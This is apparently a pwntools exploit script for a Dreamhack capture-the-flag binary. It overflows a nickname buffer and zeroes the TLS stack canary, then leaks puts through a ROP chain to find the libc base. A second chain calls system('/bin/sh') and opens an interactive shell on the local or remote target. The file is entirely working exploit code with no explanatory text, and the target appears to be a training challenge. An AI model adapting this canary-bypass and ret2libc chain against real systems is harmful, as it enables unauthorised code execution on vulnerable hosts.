#!/usr/bin/python3 
from pwn import *

exe = ELF('./prob_patched',checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, n: sla(msg, str(n).encode())
san = lambda msg, n: sa(msg, str(n).encode())
sln = lambda n: sl(str(n).encode())
sn = lambda n: s(str(n).encode())

ru = lambda data: p.recvuntil(data)
rud = lambda data: p.recvuntil(data, drop=True)
rl = lambda p: p.recvline()
r = lambda count: p.recv(count)

leak = lambda i, offset = 0: u64(i.ljust(8, b'\0')) - offset
leak_hex = lambda i, offset = 0: int(i, 16) - offset
leak_dec = lambda i, offset = 0: int(i, 10) - offset
info = lambda msg, addr: log.info(msg + hex(addr))

def GDB():
	gdb.attach(p, gdbscript='''
		b* 0x4015f5
		c
		''')

if args.REMOTE:
	HOST = "host3.dreamhack.games"
	PORT = 16307
	p = remote(HOST, PORT)
else:
	p = process(exe.path)

def tmp():
	sla(b'1 to 9): ', b'1')
	sl(b'1')
	sl(b'1')

#GDB() #overwrite TLS
input()
pop_rdi = 0x4013b3
rw_section = 0x404500

for _ in range(5):
	for _ in range(4):
		tmp()
	sa(b'nickname: ', b'k')
	sla(b'(yes/no): ', b'yes')

for _ in range(4):
	tmp()

pld = b''
pld = pld.ljust(0x118, b'\x00') + p64(pop_rdi)
pld += p64(exe.got.puts) + p64(exe.plt.puts)
pld += p64(exe.sym.main)
pld = pld.ljust(0x7d8 + len(pld), b'\x00') + p64(rw_section)
pld = pld.ljust(0x928, b'\x00') + p64(0) #fs:0x28
sa(b'nickname: \n', pld)
libc.address = leak(r(6), libc.sym.puts) 
info("Libc Base : ", libc.address)

for _ in range(4):
	tmp()

pld = b''
pld = pld.ljust(0x118, b'\x00') + p64(pop_rdi)
pld += p64(next(libc.search(b'/bin/sh'))) + p64(pop_rdi + 1)
pld += p64(libc.sym.system)
sa(b'nickname: \n', pld)

p.interactive()
